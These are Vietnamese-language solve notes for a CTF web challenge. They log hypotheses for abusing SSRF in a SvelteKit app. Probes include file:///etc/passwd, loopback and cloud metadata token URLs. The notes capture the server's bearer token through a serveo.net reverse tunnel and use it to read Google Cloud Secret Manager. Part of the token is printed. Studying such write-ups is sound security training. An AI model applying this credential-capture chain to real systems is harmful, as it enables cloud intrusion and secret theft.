# notes.md - cloudy-spaceships

Input: `http://34.116.80.78:9143/` (SvelteKit, không kèm file)
Định dạng cờ đề yêu cầu: `CSSCTF{...}`

## H1 - Board "live hull readings" nghĩa là server có số liệu riêng cho từng tàu
cmd: `python analysis/temperature_probe.py`
evidence: cùng resolver `https://example.com/` ra `71.3` cho cả năm tàu trên board và cho tàu
bịa `Zhiping`; `/api/v1/ship/../../../etc/passwd/temperature` ra 404.
result: DEAD - tên tàu không phải input của phép tính, nó chỉ là nhãn nút và tham số route.

## H2 - Con số nhiệt độ là digest của nội dung server fetch được
cmd: `node -e` quét `md5/sha1/sha256/sha512` của body tải local theo từng offset 4 byte, rồi
`python analysis/temperature_model.py`
evidence: `example.com` 713 B → `71.3`, `1.1.1.1` 56614 B → `5661.4` trông như `len/10`, nhưng
Wikipedia tải local 515963 B trong khi server báo `3604.6`; không tổ hợp digest/modulo nào cho
ra ba số đã đo.
result: DEAD - body mà server đọc không tái tạo được từ phía mình, nên mọi phép model trên dữ
liệu local đều vô nghĩa. Con số là đường cụt, không phải oracle.

## H3 - Vòng gọi lại bị chặn: SSRF chỉ dùng ra ngoài Internet được
cmd: `python analysis/resolver_probe.py` với `file:///etc/passwd`, `http://127.0.0.1/`,
`http://localhost/`, `http://[::1]/`
evidence: bốn trường hợp đều HTTP 500 với trang `Internal Error` đã lưu ở `files/error_127.html`.
Nhưng `http://127.0.0.1:1/`, `:9`, `:65500` (không có dịch vụ nào nghe) cũng cho đúng trang 500
đó (`analysis/refute_length_model.log`), và `http://169.254.169.254/` thì trả 200
(`analysis/metadata_probe.log`).
result: DEAD - 500 là nhánh "fetch thất bại" chung cho nhiều nguyên nhân, không phải bằng chứng
"SSRF bị khoá". Kết luận này ở phiên đầu là chỗ đọc sai to nhất: nó làm dừng lại ở bước mà
primitive vẫn còn sống.

## H4 - Callback không nhận được request, nên hướng hứng header không chạy được
cmd: `ls hits.log` (không có file), trong khi listener cũ vẫn trả `200` trên cùng port
evidence: request của server thực ra được ghi vào `listener.log` của tiến trình listener cũ
chạy từ trước; tiến trình listener mới chết ngay với `EADDRINUSE` và không ghi log nào.
result: DEAD - lỗi ở phía mình: port đã có chủ nên "không có hit" là "log sai file". Bản dựng lại
dùng port 8911 và listener in nội dung độc nhất (`CLOUDY-<epoch>`) để không nhầm lần nữa.

## H5 - Token của instance nằm ở metadata endpoint, đọc qua oracle độ dài
cmd: `python analysis/metadata_probe.py` với `.../computeMetadata/v1/instance/service-accounts/default/token`
evidence: HTTP 200, thân bài chỉ là con số `167.5`, tức 1675 byte; không có kênh nào in nội dung.
result: DEAD - không đọc được chữ nào từ metadata, và không cần (xem H6).

## H6 - Header mà server gửi đi mang credential của chính nó
cmd: `python analysis/catch_auth.py 8911` + `ssh -R 80:localhost:8911 serveo.net` +
`python exploit.py <callback>`
evidence: `analysis/capture.log` ghi `authorization: Bearer ya29.c.c0AZ4...d803yu` (1024 ký tự)
với `user-agent: node-fetch/1.0`, `x-real-ip: 34.116.80.78`; `oauth2.googleapis.com/tokeninfo`
HTTP 200 `scope=https://www.googleapis.com/auth/cloud-platform`.
result: PENDING -> xác nhận ở H7

## H7 - Token dùng được để đọc Secret Manager của project chứa app
cmd: `python exploit.py <callback>`
evidence: `cloudresourcemanager` 403 lộ project number `613713115850`; `storage` 403 lộ
`meteorologist@css-ctf-2026.iam.gserviceaccount.com`; `secretmanager` HTTP 200
`totalSize=1 secrets=['goog_encryption_secret']`; `versions/1:access` trả 45 ký tự.
result: OK - cờ: `CSSCTF{your_forecast_says_love_is_on_its_way}`

## H8 - Chạy lại toàn bộ chuỗi để chắc không phải ăn may
cmd: `python exploit.py <callback>` ba lần (16:25:42, 16:26:16, 16:26:46)
evidence: lần đầu script dừng ở `[-] auth.log chua co Authorization nao` vì key header bị so
khác hoa thường; hai lần sau đọc token từ chính callback vừa hứng và cùng ra một chuỗi 45 ký tự,
ghi `flag.txt`. `exploit.py` không hardcode token và không exit 0 nếu payload không bắt đầu bằng
`CSSCTF{`.
result: OK - cờ đã được ghi ở `flag.txt`.

---

Nguyên tắc ghi: không xoá nhánh sai, chỉ thêm `result: DEAD - <lý do>`, để lần sau đọc lại không thử trùng.
